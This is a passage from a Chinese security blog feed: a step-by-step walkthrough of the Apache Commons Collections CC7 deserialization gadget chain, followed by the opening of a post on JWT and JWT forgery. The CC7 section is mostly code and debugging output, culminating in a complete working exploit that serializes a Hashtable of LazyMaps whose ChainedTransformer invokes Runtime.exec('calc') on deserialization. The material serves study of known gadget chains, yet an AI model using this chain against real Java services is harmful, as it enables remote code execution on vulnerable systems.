<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">haha.put(lazy0,<span class="number">1</span>);</span><br><span class="line">haha.put(lazy1,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>再粘过来Hashtable类的put方法一下：<br><img src="/2024/08/13/CC7/image-20240801184952561.png" alt="image-20240801184952561"></p>
<p>这样就可以基本说明为什么我可以调用Hashtable的put方法了（需要注意的是第一次put不会触及for循环，因为table无任何条目，第二次put才会开始比较）。</p>
<p>但是需要注意的是，当我传入了LazyMap实例，无论是反序还是put方法这里，在<code>key.hashCode()</code>都不会是首先调用默认的String.java的hashCode()方法了，由于LazyMap没有定义hashCode方法，这里就会到父类AbstractMapDecorator的hashCode方法：</p>
<p><img src="/2024/08/13/CC7/image-20240801194715026.png" alt="image-20240801194715026"></p>
<p>这里就会又到HashMap（HashMap内部类有hashCode，不可用）<strong>父类AbstractMap的hashCode()方法</strong>：<br><img src="/2024/08/13/CC7/image-20240801195406545.png" alt="image-20240801195406545"></p>
<p>（这里往后的hashCode()方法调用过程是后面的某个测试代码调试出来的，可以先只暂时了解）然后这里调用的hashCode是<code>HashMap</code>内部类<code>Node</code>类的hashCode()方法，如下：</p>
<p><img src="/2024/08/13/CC7/image-20240801222242418.png" alt="image-20240801222242418"></p>
<p>然后差不多就到了String.java的hashCode方法：</p>
<p><img src="/2024/08/13/CC7/image-20240801215613372.png" alt="image-20240801215613372"></p>
<p>String.java的hashCode()就是用来计算哈希码的。<u>同时注意（重要）</u>：<strong>在上上面那个hashCode()，也就是内部类Node的hashCode()方法对key和value都调用了hashCode()计算哈希码后异或求得值，也就是最终的哈希码，所以对于最终的哈希码我们需要兼顾键和值</strong>。</p>
<p>————</p>
<p>结合String.java的hashCode方法，可以知道<strong>AbstractMap的hashCode方法</strong>的作用就是计算哈希码，通过迭代器<strong>遍历每个条目</strong>，调用每个条目的<code>hashCode()</code>方法，然后将得到的哈希码累加到变量<code>h</code>中。最后返回h。</p>
<p>但是由于我们最开始调用的hashCode()是LazyMap对象，并且由于这个<strong>对象里面并没有存储有键值对</strong>，所以<strong>这里会直接返回0</strong>。</p>
<p>本来我还以为刚好，这样都返回0的话正好使得<code>e.hash=hash</code>可以成立，但是需要注意的是，当我们在序列化之前调用put()的时候，看put()方法的如下源码：</p>
<p><img src="/2024/08/13/CC7/image-20240801200313953.png" alt="image-20240801200313953"></p>
<p>他这里也有个for循环来防止有重复的键，这个代码的作用就是如果条件成立，也就是条目相匹配，就会将条目<code>entry</code>对应的键的value更改为新的value。再来看我们的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">haha.put(lazy0,<span class="number">1</span>);</span><br><span class="line">haha.put(lazy1,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p><strong>现在的问题就是想这个<code>entry.key.equals(key)</code>是否会通过导致无法正常放入两个键值对。</strong></p>
<p>直接从第二次放入键值对开始说，这里由于我放入的是LazyMap类实例，本来以为会按照我们前面说的流程走一遍，最后会调用到AbstractMap类的equals()停下，大错特错。看代码</p>
<p>直接使用如下代码来测试：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(lazy0.equals(lazy1))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//output:相等</span></span><br></pre></td></tr></table></figure>

<p>这里的输出为相等，那这就是说明会进入if条件，导致不能成功放入两个键值对。但是在前面的分析中，如果想要成功构造利用链，那么就<strong>必须是传入两个LazyMap的实例</strong>。所以这里要想如何解决。打断点来调试一下：<br><img src="/2024/08/13/CC7/image-20240802171424683.png" alt="image-20240802171424683"></p>
<p>直接按照预期进入到LazyMap父类AbstractMapDecorator的equals()方法：<br><img src="/2024/08/13/CC7/image-20240801205912932.png" alt="image-20240801205912932"></p>
<p>在前面基本流程那里说过，这里就是判断调用这个equals()方法的对象和传入的object引用的对象是否相同，很不巧的是我们都传入了LazyMap对象，导致了这里使得条件成立，返回true。</p>
<p><strong>但是</strong>，柳暗花明又一村，在调试时，在上面点击下一步后，看：</p>
<p><img src="/2024/08/13/CC7/image-20240801210157525.png" alt="image-20240801210157525"></p>
<p>这里还要调用一次size()方法（这个size()方法过后就没按照预期走了），所以这里会调用HashMap的size()方法</p>
<p><img src="/2024/08/13/CC7/image-20240801211235910.png" alt="image-20240801211235910"></p>
<p>这个HashMap的size()方法只是返回当前 <code>HashMap</code> 中存储的键值对的总数。</p>
<p>这里提到了键值对，那么我们添加一个键值对试试，这里直接对LazyMap对象使用put也行，因为LazyMap的父类实现了put方法：<br><img src="/2024/08/13/CC7/image-20240801211625266.png" alt="image-20240801211625266"></p>
<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line">        lazy0.put(<span class="string">&quot;xxx&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line">        lazy1.put(<span class="string">&quot;xxx&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(lazy0.equals(lazy1))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次没有输出，说明这里不相同了，不会进入false，也就可以放入两个值了。</p>
<p>（遗留一个问题吧，不知道为啥这里会直接到size()并且影响判断）</p>
<p>并且这里在调试时确实可以进入到最后的<code>AbstractMap</code>的<code>equals()</code>方法并且最终成功调用LazyMap的get方法：<br><img src="/2024/08/13/CC7/image-20240802172158779.png" alt="image-20240802172158779"></p>
<p><strong>问题equals()方法调用解决。</strong></p>
<p>那么现在我们又需要注意第一个条件，前面是直接设定的没有键值对，但是由于第二个条件的解决办法，导致我们这里必须要思考如何使得hash相同，最后调用的hashCode方法：<br><img src="/2024/08/13/CC7/image-20240801214556431.png" alt="image-20240801214556431"></p>
<p>接用代码测试看看：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line">        lazy0.put(<span class="string">&quot;xx&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line">        lazy1.put(<span class="string">&quot;xxxx&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(lazy1.hashCode()==lazy0.hashCode())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有输出，说明不是相同的。这里就涉及到了哈希碰撞的问题，不多说，在ysoserial链中调用的是<code>yy</code>和<code>zZ</code>，这两个值的hashCode()结果是相同的：<br><img src="/2024/08/13/CC7/image-20240801223140188.png" alt="image-20240801223140188"></p>
<p>同时结合前面最开始调试hashCode那部分说了会调用到HashMap内部类Node的hashCode()方法：<br><img src="/2024/08/13/CC7/image-20240801225144106.png" alt="image-20240801225144106"></p>
<p>所以这里的value也需要设置为相同的，所以最终的测试代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line">        lazy0.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line">        lazy1.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(lazy1.hashCode()==lazy0.hashCode())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功输出相等。</p>
<p>但是此时将这个代码稍微修改一下又可以用来测试第二个条件（但是有问题），如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line">        lazy0.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line">        lazy1.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(lazy0.equals(lazy1))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出：相等</span></span><br></pre></td></tr></table></figure>

<p>很怪反正，代码绝对有问题，要么就是我的JVM虚拟机有点问题，直接在最终equals()方法加断点可以到，这里不管put进的键是什么，<strong>只要两个值都是1就会输出相等（好像only 1）</strong>，但是这里都改成其他的比如2就不会了，改成2对于hashCode应该也没有影响，并且代码输出也没有问题。</p>
<p>那么就可以尝试构造真正的利用链了，还需要注意的就是在第二次put的时候就会执行一次调用链了，此时就需要注意LazyMap的get()方法，和之前的CC6差不多，需要remove，直接打断点来看传进去的值：</p>
<p><img src="/2024/08/13/CC7/image-20240802001231117.png" alt="image-20240802001231117"></p>
<p>再看进入这个get方法的equals()方法的位置：</p>
<p><img src="/2024/08/13/CC7/image-20240802001653262.png" alt="image-20240802001653262"></p>
<p>此时的key是lazy0的键，所以这里会对lazy1的哈希表再put进一个值：</p>
<p><img src="/2024/08/13/CC7/image-20240802001948885.png" alt="image-20240802001948885"></p>
<p>这里结果是1很正常，fakeTransformer链子返回的就是这个。</p>
<p>同时在Hashtable的readObject()方法中，要注意下面的代码：<br><img src="/2024/08/13/CC7/image-20240802002126349.png" alt="image-20240802002126349"></p>
<p>也就是要求对象的键值对个数相同。所以我们这里需要将第二个对象增加的键值对（yy-1）删去。最终构成如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] chainpart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,chain);</span><br><span class="line">        lazy0.put(<span class="string">&quot;yy&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,chain);</span><br><span class="line">        lazy1.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        hashtable.put(lazy0,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazy1,<span class="number">2</span>);</span><br><span class="line">        hashMap1.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">x</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        x.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        x.set(chain,chainpart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashtable);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机。</p>
<p>问题：</p>
<ul>
<li>不加键值对直接到size()问题</li>
<li>哈希碰撞问题</li>
<li>为什么对LazyMap使用put时的键值对的值需要相同，可能是内部类Node那里的hashCode方法原因。</li>
</ul>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java反序列化调用链分析</category>
        <category>CC7</category>
      </categories>
  </entry>
  <entry>
    <title>JWT以及jwt伪造</title>
    <url>/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<p>  JWT是一种安全机制，在某些情况下我们可以通过伪造jwt来任意用户登录</p>
<span id="more"></span>

<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><h3 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h3><p>Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。<strong>JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源</strong>，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<p><strong>作用:</strong></p>
<ol>
<li><strong>授权</strong>:<em>一旦用户登录，每个后续请求将包含JWT，从而允许用户访问该令牌允许的路由、服务和资源</em>。它的开销很小并且可以在不同的域使用。如：单点登录。</li>
<li><strong>信息交换</strong>：在各方之间安全地传输信息。JWT可进行签名（如使用公钥&#x2F;私钥对），因此可确保交换双方信息的正确。由于前面是使用表头和有效负载计算的，因此还可验证内容是否被篡改。</li>
</ol>
<h3 id="传统session认证"><a href="#传统session认证" class="headerlink" title="传统session认证"></a>传统session认证</h3><h4 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h4><p><strong>http协议本身是一种无状态的协议，</strong>即使用户向服务器提供了用户名和密码来进行用户认证，在下次请求时用户也得再一次进行用户认证。<em>因为根据http协议，服务器并不能知道接收到的请求来自哪个用户</em>，所以为了让应用能识别是哪个用户发出的请求，只能在服务器存储─份用户登录的信息，<u>这份登录信息会在响应时传递给浏览器，告诉其保存为cookie以便下次请求时发送给应用。这样应用就能识别请求来自哪个用户。</u></p>
<p><a href="https://www.51cto.com/article/679219.html">cookie与session区别</a></p>
<h4 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h4><ol>
<li>用户经改应用认证后，应用都要在服务端存储一份session。而session一般都是保存在内存中，随着认证用户的增多，<strong>服务端的开销会明显增大</strong>。而且用户下次的请求还必须发送到这台服务器上，这样才能拿到授权的资源。<strong>在分布式应用上相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力</strong></li>
<li>session是基于cookie来进行用户识别，cookie如果被截获，用户很容易受到<strong>CSRF（跨站伪造请求攻击)攻击</strong>。</li>
</ol>
<h3 id="基于token的鉴权机制"><a href="#基于token的鉴权机制" class="headerlink" title="基于token的鉴权机制"></a>基于token的鉴权机制</h3><p>基于token的鉴权机制类似于http协议也是无状态的，<strong>它不需要去保留用户的认证信息或者会话信息</strong>，这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。</p>
<p>流程上是这样的：</p>
<pre><code>用户使用用户名密码来请求服务器
服务器进行验证用户的信息
服务器通过验证发送给用户一个token
客户端存储token，并在每次请求时附送上这个token值
服务端验证token值，并返回数据
</code></pre>
<p>这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持CORS(跨来源资源共享)策略，一般我们在服务端这么做就可以了Access-Control-Allow-Origin: *。</p>
<h3 id="JWT认证"><a href="#JWT认证" class="headerlink" title="JWT认证"></a>JWT认证</h3><h4 id="JWT原理"><a href="#JWT原理" class="headerlink" title="JWT原理"></a>JWT原理</h4><p>服务器认证以后，申城一个JSON对象，发回给用户，类似下面这个数据结构:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;姓名&quot;: &quot;张三&quot;,</span><br><span class="line">  &quot;角色&quot;: &quot;管理员&quot;,</span><br><span class="line">  &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

